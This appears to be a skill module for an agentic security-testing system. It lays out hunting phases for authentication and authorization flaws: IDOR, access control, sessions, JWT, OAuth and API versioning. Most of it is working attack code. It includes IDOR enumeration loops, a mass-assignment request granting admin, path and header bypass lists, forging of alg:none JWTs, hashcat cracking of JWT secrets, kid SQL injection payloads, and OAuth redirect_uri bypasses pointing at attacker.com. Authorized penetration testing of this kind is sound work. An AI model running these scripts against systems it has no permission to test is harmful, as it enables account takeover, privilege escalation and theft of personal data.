# SKILL-AUTH — Authentication & Authorization Vulnerabilities
# Phase Coverage: 11-15, 34
# Vuln Classes: IDOR, Access Control, Auth/Session, JWT, OAuth, API Versioning
# Purpose: Identity, authorization, and session management vulnerability discovery

---

## Phase 11: IDOR / Broken Object Level Authorization — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns IDOR, or JS signals /api/users/{id}, /api/orders/{id}.
SURFACE TYPES: any endpoint that fetches/modifies user-specific objects by ID.
```

### SUB-PHASE 11.2: HUNT

**Sequential enumeration:**
```bash
#!/bin/bash
TARGET=$1; TOKEN1=$2; TOKEN2=$3; ENDPOINT=$4
echo "[*] IDOR sweep: $TARGET$ENDPOINT"
for id in $(seq 1 200); do
  RESP=$(curl -sk "$TARGET$ENDPOINT/$id" \
         -H "Authorization: Bearer $TOKEN2" -w "\nHTTP:%{http_code}")
  echo "$RESP" | grep -vE "HTTP:40[0-9]" | grep "HTTP:" \
    && echo "[IDOR] ID=$id accessible by user2"
done
# Cross-account: user1 owns object, user2 reads it
MY_OBJ=$(curl -sk -X POST "$TARGET$ENDPOINT" \
          -H "Authorization: Bearer $TOKEN1" \
          -H "Content-Type: application/json" \
          -d '{"name":"test"}' | jq -r '.id')
RESP=$(curl -sk "$TARGET$ENDPOINT/$MY_OBJ" \
       -H "Authorization: Bearer $TOKEN2" -w " HTTP:%{http_code}")
[[ "$RESP" == *"200"* ]] && echo "[IDOR CONFIRMED — CIA:C:H] user2 reads user1 object"
```

**Base64 ID bypass:**
```bash
python3 -c "
import base64
for i in [1,2,3,100]:
    enc = base64.b64encode(f'user_{i}'.encode()).decode()
    print(f'ID {i}: {enc}')
"
```

**HTTP method matrix:**
```bash
for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  printf "$m: "
  curl -sk -X "$m" "$TARGET/api/endpoint" \
       -H "Authorization: Bearer $USER1_TOKEN" -w "%{http_code}\n" -o /dev/null
done
```

**Mass assignment with privilege escalation:**
```bash
curl -sk -X PUT "$TARGET/api/Users/me" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin","isAdmin":true,"privilege":99,"credit":999999}' | jq .
```

### CHAIN OUTPUT:
  → IDOR read (medium) + CORS = cross-origin data exfil (high)
  → IDOR write (high) + mass-assignment = privilege escalation (critical)
  → IDOR on password reset token → ATO (critical)
  → IDOR + 2FA bypass = mass ATO (critical)

---

## Phase 12: Broken Access Control — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns access-control, or JS signals isAdmin client-side gates.
SURFACE TYPES: admin endpoints, privileged features, role-gated content.
```

### SUB-PHASE 12.2: HUNT

**Admin path enumeration:**
```bash
ADMIN_PATHS=("/admin" "/admin/users" "/administrator" "/manager" "/console"
             "/api/admin" "/api/internal" "/api/private" "/actuator/env"
             "/actuator/heapdump" "/.env" "/.git/config")
for path in "${ADMIN_PATHS[@]}"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/access_test.txt \
       "$TARGET$path" -H "Authorization: Bearer $USER1_TOKEN")
  [[ "$S" == "200" ]] && echo "[ACCESS CONTROL — CIA:C:H] $path → HTTP $S" \
    && head -3 /tmp/access_test.txt
done
```

**Header-based override:**
```bash
for header in "X-Original-URL: /admin/users" "X-Rewrite-URL: /admin/users" \
              "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1"; do
  S=$(curl -sk -w "%{http_code}" -o /dev/null "$TARGET/" \
       -H "Authorization: Bearer $USER1_TOKEN" -H "$header")
  [[ "$S" == "200" ]] && echo "[ACCESS CONTROL bypass via header] $header"
done
```

**Path normalization bypass:**
```bash
for path in "/ADMIN" "/%2fadmin" "//admin//" "/admin/../admin/" "/admin;/"; do
  S=$(curl -sk -w "%{http_code}" -o /dev/null "$TARGET$path")
  [[ "$S" == "200" ]] && echo "[ACCESS CONTROL path bypass] $path"
done
```

**HTTP method override:**
```bash
curl -sk -X POST "$TARGET/api/user/delete" \
     -H "X-HTTP-Method-Override: DELETE" \
     -H "Authorization: Bearer $USER1_TOKEN" -w " HTTP:%{http_code}"
```

### CHAIN OUTPUT:
  → Access-control bypass (high) + admin panel = full data access (critical)
  → Path bypass + JWT weak = admin without valid credentials (critical)

---

## Phase 13: Authentication & Session Management — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns auth/session, or login/logout/session endpoints present.
SURFACE TYPES: login, logout, session handling, token lifecycle.
```

### SUB-PHASE 13.2: HUNT

**Username enumeration:**
```bash
for email in "admin@target.com" "user@target.com" "xyz_fake_99@nothing.io"; do
  T=$(curl -sk -o /tmp/login_resp.txt -w "%{time_total}" -X POST "$TARGET/api/login" \
       -H "Content-Type: application/json" \
       -d "{\"email\":\"$email\",\"password\":\"wrong\"}")
  MSG=$(grep -oiE "invalid password|user not found|no account|incorrect" /tmp/login_resp.txt | head -1)
  echo "$email: ${T}s | $MSG"
done
```

**Predictable session tokens:**
```bash
python3 - << 'EOF'
import requests, hashlib, time, os
TARGET = os.environ.get('TARGET', 'http://localhost:3000')
for i in range(int(time.time())-5, int(time.time())+1):
    tok = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(f"{TARGET}/api/profile", cookies={"session": tok}, timeout=3)
    if r.status_code == 200 and "error" not in r.text.lower():
        print(f"[PREDICTABLE SESSION — CIA:C:H] token: {tok}")
EOF
```

**Session fixation:**
```bash
curl -sk -c /tmp/pre_login.txt -b /tmp/pre_login.txt "$TARGET/login" -D - \
  | grep -i "set-cookie" > /tmp/pre_session.txt
curl -sk -c /tmp/post_login.txt -b /tmp/pre_login.txt \
     -X POST "$TARGET/api/login" \
     -H "Content-Type: application/json" \
     -d '{"email":"user@t.com","password":"Pass1!"}' -D - \
     | grep -i "set-cookie" > /tmp/post_session.txt
diff /tmp/pre_session.txt /tmp/post_session.txt || echo "[SESSION FIXATION — CIA:C:H]"
```

**Reset token in response:**
```bash
TOKEN=$(curl -sk -X POST "$TARGET/forgot-password" \
        -H "Content-Type: application/json" \
        -d '{"email":"known@target.com"}' | jq -r '.token // .resetToken // empty')
[[ -n "$TOKEN" ]] && echo "[CIA:C:H] RESET TOKEN LEAKED IN RESPONSE: $TOKEN"
```

### CHAIN OUTPUT:
  → Session fixation (high) + CSRF = force victim to attacker's session (critical)
  → Password reset token in response (high) = direct ATO (critical)
  → Username enumeration (low) + timing attack = targeted brute force (high)

---

## Phase 14: JWT Vulnerabilities — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns JWT, or JS signals jwt.decode(), localStorage token.
SURFACE TYPES: JWT-authenticated APIs.
```

### SUB-PHASE 14.2: HUNT

**Decode:**
```bash
python3 - << 'EOF'
import base64, json, os
tok = os.environ.get('USER1_TOKEN', '')
for i, part in enumerate(tok.split('.')[:2]):
    padded = part + '=' * (4 - len(part) % 4)
    try: print(f"Part {i}:", json.dumps(json.loads(base64.urlsafe_b64decode(padded)), indent=2))
    except: print(f"Part {i}: [not JSON]")
EOF
```

**alg:none attack:**
```bash
python3 - << 'EOF'
import base64, json
def b64e(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip('=')
for alg in ["none","None","NONE","nOnE"]:
    h = b64e({"alg":alg,"typ":"JWT"})
    p = b64e({"sub":"1","data":{"id":1,"email":"admin@target.com","role":"admin"},"iat":9999999999})
    print(f"[{alg}] {h}.{p}.")
EOF
```

**Weak secret brute-force:**
```bash
echo "$USER1_TOKEN" > /tmp/jwt.txt
hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --quiet
```

**RS256 → HS256 confusion:**
```bash
curl -sk "$TARGET/.well-known/jwks.json" | jq .
# Sign with public key as HMAC secret → if server verifies with RS256 pubkey = bypass
```

**kid SQL/path traversal:**
```bash
# {"alg":"HS256","kid":"../../dev/null"} → sign with empty key
# {"alg":"HS256","kid":"x' UNION SELECT 'attacker_secret'--"}
```

### CHAIN OUTPUT:
  → JWT alg:none (critical standalone) → admin API access → DB dump (critical)
  → JWT weak secret → forge admin role → mass ATO (critical)
  → JWT kid SQLi → inject custom signing key → forge any token (critical)

---

## Phase 15: OAuth2 / OpenID Connect Flaws — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns OAuth, or JS signals window.location = authUrl.
SURFACE TYPES: social login, SSO, any OAuth authorization flow.
```

### SUB-PHASE 15.2: HUNT

**redirect_uri bypass:**
```bash
for redir in \
  "https://attacker.com/callback" \
  "https://legit.com.attacker.com/" \
  "https://legit.com@attacker.com/" \
  "https://legit.com/../../attacker.com/" \
  "https://legit.com?url=https://attacker.com" \
  "https://legit.com/redirect?url=https://attacker.com"; do
  URL="$TARGET/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$redir''',safe=''))")&scope=openid"
  LOC=$(curl -sk -o /dev/null -w "%{redirect_url}" "$URL")
  [[ "$LOC" == *"attacker"* ]] && echo "[OAUTH REDIRECT — CIA:C:H] $redir → $LOC"
done
```

**Missing state parameter (CSRF):**
```bash
# Check if /authorize request includes &state= parameter
# If missing → CSRF on OAuth flow → force victim to link attacker's account
```

**Token leakage via Referer (implicit flow):**
```bash
mcp_burp_get_proxy_http_history_regex(regex="access_token|id_token|token=")
```

### CHAIN OUTPUT:
  → OAuth redirect_uri bypass (critical) → token theft → ATO (critical)
  → Missing state (medium) + open-redirect = CSRF token theft (high)
  → OAuth token in URL + Referer leak = token exfil (high)

---

## Phase 34: API Security Flaws — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns api-versioning, or JS signals /api/v* paths.
SURFACE TYPES: all API endpoints, especially versioned (/v1/, /v2/) and undocumented ones.
```

### SUB-PHASE 34.2: HUNT

**Version traversal:**
```bash
for v in v1 v2 v3 v0 v4 beta dev old legacy; do
  for ep in "/api/$v/users" "/api/$v/admin" "/$v/api/users" "/api/$v/profile"; do
    S=$(curl -sk -w "%{http_code}" -o /tmp/ver_test.txt "$TARGET$ep" \
         -H "Authorization: Bearer $USER1_TOKEN")
    [[ "$S" == "200" ]] && echo "[API VERSION — CIA:C:H] $ep → HTTP $S" && head -3 /tmp/ver_test.txt
  done
done
```

**Swagger/OpenAPI exposure:**
```bash
for p in "/swagger.json" "/swagger/v1/swagger.json" "/openapi.json" "/api-docs" \
         "/v2/api-docs" "/v3/api-docs" "/swagger-ui.html"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/swagger.json "$TARGET$p")
  [[ "$S" == "200" ]] && jq '.paths | keys[]' /tmp/swagger.json 2>/dev/null \
    | tee -a ~/agents/acy/fullrecon/${SLUG}/discovered_endpoints.txt
    && echo "[OPENAPI FOUND — CIA:C:M] $p"
done
```

**Excessive data exposure:**
```bash
curl -sk "$TARGET/api/user/me" -H "Authorization: Bearer $USER1_TOKEN" | jq 'keys[]'
# Flag: password_hash, ssn, dob, internal_notes, api_key in response = C:H
```

### CHAIN OUTPUT:
  → Old API version (medium) + removed auth = unauthenticated data access (critical)
  → Swagger exposure (low) + hidden admin endpoints = privileged access (high)
  → Excessive data exposure (medium) + IDOR = mass PII dump (critical)

---

*SKILL-AUTH — Authentication & Authorization Vulnerabilities Module*
*Part of the acy Agentic Security Research System*
